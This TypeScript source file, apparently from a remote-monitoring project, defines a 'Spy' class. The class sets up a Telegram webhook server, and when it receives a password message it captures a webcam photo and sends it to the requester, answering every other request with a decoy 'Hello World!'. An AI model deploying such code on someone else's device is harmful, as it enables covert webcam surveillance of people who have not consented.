import { ISpy } from './ISpy.interface';
import { IServerService } from '../server/IServerService.interface';
import { IWebcamService } from '../webcam/IWebcamService.interface';
import { ITelegramService } from '../telegram/ITelegramService.interface';
import { IFileSystemService } from '../file-system/IFileSystemService.interface';
import { IMessageBody } from '../common/model/IMessageBody.interface';
import { ISpyConfiguration } from '../common/model/ISpyConfiguration.interface';

const FILE_NAME = 'photo';

export class Spy implements ISpy {
  constructor(
    private configuration: ISpyConfiguration,
    private serverService: IServerService,
    private webcamService: IWebcamService,
    private telegramService: ITelegramService,
    private fileSystemService: IFileSystemService,
  ) {}

  async start(): Promise<void> {
    const requestListener = async (request: Request, response: Response): Promise<void> => {
      const body: Uint8Array[] = [];
      (request as any)
        .on('data', (chunk: any) => {
          body.push(chunk);
        })
        .on('end', async () => {
          const bodyParsed: IMessageBody = JSON.parse(Buffer.concat(body).toString());

          if (bodyParsed.message.text !== this.configuration.password) {
            (response as any).write('Hello World!');
            (response as any).end();
            return;
          }

          await this.webcamService.makePhoto(FILE_NAME);
          await this.telegramService.sendPhoto(
            bodyParsed.message.from.id,
            `${this.configuration.currentPath}/${FILE_NAME}.jpg`,
          );

          (response as any).write('Hello World!');
          (response as any).end();
        });
    };

    const url = await this.serverService.createServer(requestListener, 9990);
    console.log(url);

    await this.telegramService.setWebhook(url);
    await this.fileSystemService.removeFile(process.cwd() + `${this.configuration.currentPath}/${FILE_NAME}.jpg`);
  }
}
